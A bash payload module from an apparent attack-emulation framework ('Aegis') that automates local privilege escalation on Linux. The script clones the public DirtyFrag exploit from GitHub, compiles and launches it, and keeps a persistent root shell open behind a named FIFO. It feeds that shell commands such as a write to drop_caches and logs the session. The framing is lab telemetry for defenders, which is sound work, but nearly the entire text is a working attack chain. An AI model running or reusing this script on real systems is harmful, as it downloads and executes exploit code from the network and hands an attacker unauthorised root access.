#!/usr/bin/env bash
#
# payloads/priv_esc/root_dirtyfrag/commands.sh
#
# Builds and runs the DirtyFrag proof-of-concept to simulate local privilege
# escalation telemetry in an isolated Aegis lab/VM target.

set -Eeuo pipefail

if [[ "${ROOT_DIRTYFRAG_DEBUG:-false}" == "true" ]]; then
    set -x
fi

if [[ -z "${FRAMEWORK_ROOT:-}" ]]; then
    echo "[x] FRAMEWORK_ROOT must be set" >&2
    exit 1
fi

source "$FRAMEWORK_ROOT/lib/log_utils.sh"
source "$FRAMEWORK_ROOT/lib/template_utils.sh"
source "$FRAMEWORK_ROOT/lib/metadata_utils.sh"

shell_quote() {
    printf "%q" "$1"
}

is_safe_dirtyfrag_base() {
    local base="$1"

    case "${base%/}/aegis_dirtyfrag_${RUN_ID:-manual}" in
        /tmp/aegis_dirtyfrag_* | /var/tmp/aegis_dirtyfrag_* | /dev/shm/aegis_dirtyfrag_* | \
        /tmp/.cache/aegis_dirtyfrag_* | /tmp/.config/aegis_dirtyfrag_* | \
        /var/tmp/.system/aegis_dirtyfrag_* | /dev/shm/.runtime/aegis_dirtyfrag_*)
            return 0
            ;;
        *)
            return 1
            ;;
    esac
}

pick_writable_dirtyfrag_base() {
    local candidate
    local probe

    for _ in 1 2 3 4 5 6 7 8 9 10; do
        candidate="$(pick_staging_dir)"
        is_safe_dirtyfrag_base "$candidate" || continue
        probe="${candidate%/}/aegis_dirtyfrag_probe_${RUN_ID:-manual}_$$"

        if mkdir -p "$probe" 2>/dev/null; then
            rmdir "$probe" >/dev/null 2>&1 || true
            printf '%s\n' "${candidate%/}"
            return 0
        fi
    done

    for candidate in /tmp /var/tmp /dev/shm; do
        probe="${candidate%/}/aegis_dirtyfrag_probe_${RUN_ID:-manual}_$$"
        if mkdir -p "$probe" 2>/dev/null; then
            rmdir "$probe" >/dev/null 2>&1 || true
            printf '%s\n' "${candidate%/}"
            return 0
        fi
    done

    fail "Unable to find writable DirtyFrag staging base"
}

log "root_dirtyfrag starting"
log "Execution user: $(whoami)"
log "Execution id: $(id)"

DIRTYFRAG_REPO_URL="${DIRTYFRAG_REPO_URL:-https://github.com/V4bel/dirtyfrag.git}"
DIRTYFRAG_BASE_DIR="${DIRTYFRAG_BASE_DIR:-}"
if [[ -z "$DIRTYFRAG_BASE_DIR" ]]; then
    DIRTYFRAG_BASE_DIR="$(pick_writable_dirtyfrag_base)"
fi
DIRTYFRAG_WORKDIR="${DIRTYFRAG_WORKDIR:-${DIRTYFRAG_BASE_DIR}/aegis_dirtyfrag_${RUN_ID:-manual}}"
DIRTYFRAG_DROP_CACHES_VALUE="${DIRTYFRAG_DROP_CACHES_VALUE:-3}"
DIRTYFRAG_REMOVE_EXISTING_WORKDIR="${DIRTYFRAG_REMOVE_EXISTING_WORKDIR:-true}"
DIRTYFRAG_SESSION_READY_TIMEOUT="${DIRTYFRAG_SESSION_READY_TIMEOUT:-20}"
DIRTYFRAG_SESSION_FIFO="${DIRTYFRAG_SESSION_FIFO:-${DIRTYFRAG_WORKDIR}/root_shell.in}"
DIRTYFRAG_SESSION_TRANSCRIPT="${DIRTYFRAG_SESSION_TRANSCRIPT:-${DIRTYFRAG_WORKDIR}/root_shell.log}"
DIRTYFRAG_SESSION_PID_FILE="${DIRTYFRAG_SESSION_PID_FILE:-${DIRTYFRAG_WORKDIR}/root_shell.pid}"
DIRTYFRAG_READY_MARKER="__AEGIS_DIRTYFRAG_ROOT_SESSION_READY_${RUN_ID:-manual}__"

case "$DIRTYFRAG_WORKDIR" in
    /tmp/aegis_dirtyfrag_* | /var/tmp/aegis_dirtyfrag_* | /dev/shm/aegis_dirtyfrag_* | \
    /tmp/.cache/aegis_dirtyfrag_* | /tmp/.config/aegis_dirtyfrag_* | \
    /var/tmp/.system/aegis_dirtyfrag_* | /dev/shm/.runtime/aegis_dirtyfrag_*)
        ;;
    *)
        fail "Refusing unsafe DIRTYFRAG_WORKDIR: $DIRTYFRAG_WORKDIR"
        ;;
esac

if [[ "$DIRTYFRAG_REMOVE_EXISTING_WORKDIR" == "true" && -e "$DIRTYFRAG_WORKDIR" ]]; then
    log "Removing existing DirtyFrag workdir: $DIRTYFRAG_WORKDIR"
    rm -rf -- "$DIRTYFRAG_WORKDIR"
fi

mkdir -p "$DIRTYFRAG_WORKDIR"

record_metadata "dirtyfrag_repo_url=$DIRTYFRAG_REPO_URL"
record_metadata "dirtyfrag_workdir=$DIRTYFRAG_WORKDIR"
record_metadata "shell_session_type=fifo"
record_metadata "shell_session_user=root"
record_metadata "shell_session_input=$DIRTYFRAG_SESSION_FIFO"
record_metadata "shell_session_transcript=$DIRTYFRAG_SESSION_TRANSCRIPT"
record_metadata "shell_session_pid_file=$DIRTYFRAG_SESSION_PID_FILE"
record_metadata "shell_session_workdir=$DIRTYFRAG_WORKDIR"

log "Cloning DirtyFrag proof-of-concept"
cd "$DIRTYFRAG_WORKDIR"

git clone "$DIRTYFRAG_REPO_URL" dirtyfrag

log "Building DirtyFrag proof-of-concept"
cd dirtyfrag
gcc -O0 -Wall -o exp exp.c -lutil

record_metadata "dirtyfrag_binary=$DIRTYFRAG_WORKDIR/dirtyfrag/exp"

log "Starting DirtyFrag-backed root shell session"
rm -f -- "$DIRTYFRAG_SESSION_FIFO"
mkfifo "$DIRTYFRAG_SESSION_FIFO"
: > "$DIRTYFRAG_SESSION_TRANSCRIPT"

setsid bash -c '
    fifo="$1"
    transcript="$2"
    tail -f "$fifo" | ./exp >> "$transcript" 2>&1
' bash "$DIRTYFRAG_SESSION_FIFO" "$DIRTYFRAG_SESSION_TRANSCRIPT" \
    </dev/null >/dev/null 2>&1 &

DIRTYFRAG_SESSION_PID="$!"
printf '%s\n' "$DIRTYFRAG_SESSION_PID" > "$DIRTYFRAG_SESSION_PID_FILE"

record_metadata "shell_session_pid=$DIRTYFRAG_SESSION_PID"

sleep 2

log "Priming root shell session and dropping VM caches"
{
    printf 'id\n'
    printf 'printf %%s\\\\n %s > /proc/sys/vm/drop_caches\n' \
        "$(shell_quote "$DIRTYFRAG_DROP_CACHES_VALUE")"
    printf 'echo %s\n' "$(shell_quote "$DIRTYFRAG_READY_MARKER")"
} > "$DIRTYFRAG_SESSION_FIFO"

READY_DEADLINE=$((SECONDS + DIRTYFRAG_SESSION_READY_TIMEOUT))

while (( SECONDS < READY_DEADLINE )); do
    if grep -q "$DIRTYFRAG_READY_MARKER" "$DIRTYFRAG_SESSION_TRANSCRIPT" 2>/dev/null; then
        record_metadata "shell_session_active=true"
        break
    fi
    sleep 1
done

if ! grep -q "$DIRTYFRAG_READY_MARKER" "$DIRTYFRAG_SESSION_TRANSCRIPT" 2>/dev/null; then
    record_metadata "shell_session_active=false"
    fail "DirtyFrag root shell session did not become ready before timeout"
fi

record_metadata "dirtyfrag_drop_caches=$DIRTYFRAG_DROP_CACHES_VALUE"
record_metadata "dirtyfrag_completed=true"

log "root_dirtyfrag complete"
